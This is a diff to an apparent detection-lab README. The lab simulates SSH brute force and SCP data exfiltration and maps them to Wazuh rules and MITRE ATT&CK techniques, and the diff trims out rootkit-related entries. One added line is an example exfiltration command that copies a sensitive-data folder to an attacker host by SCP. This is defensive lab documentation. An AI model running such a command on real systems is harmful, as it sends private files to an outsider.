@@ -184,7 +184,7 @@ _The ssh rules added can be found in [ssh rules](/detection-rules/wazuh_rules.md
 Sensitive files were transferred from the victim machine using SCP:
 
 ```bash
-scp -r user@<target-ip>:~/sensitive_data .
+scp -r /sensitive_data attacker@ATTACKER_IP:/tmp/
 ```
 
 ### Detection
@@ -202,7 +202,7 @@ Detection methods included:
 | -------------------------------------- | ----- |
 | Exfiltration Over Alternative Protocol | T1048 |
 
-_The scp data exfiltration rules implemented can be found in[exfiltration config](/detection-rules/wazuh_rules.md)_
+_The scp data exfiltration rules implemented can be found in [exfiltration config](/detection-rules/wazuh_rules.md)_
 
 ---
 
@@ -216,7 +216,6 @@ _The scp data exfiltration rules implemented can be found in[exfiltration config
 | SSH Brute Force      | Brute Force                            | T1110 |
 | Successful SSH Login | Valid Accounts                         | T1078 |
 | Data Exfiltration    | Exfiltration Over Alternative Protocol | T1048 |
-| Defense Evasion      | Rootkit                                | T1014 |
 
 ---
 
@@ -228,7 +227,6 @@ The `screenshots/` directory contains:
 * Suricata detections
 * Hydra brute-force attempts
 * Nmap scan detections
-* Diamorphine detection evidence
 * SCP exfiltration activity
 
 ---
@@ -241,7 +239,6 @@ Custom rules were written for:
 * SSH brute-force attacks
 * suspicious authentication behavior
 * SCP-based exfiltration activity
-* Diamorphine-related anomalies
 
 Rule files can be found in:
 
@@ -256,7 +253,6 @@ Rule files can be found in:
 * Network-based and host-based detections complement each other
 * SIEM correlation significantly improves visibility
 * SSH remains a common attack vector in Linux environments
-* Defense evasion techniques can still leave detectable artifacts
 * Detection engineering requires balancing visibility and noise reduction
 
 ---
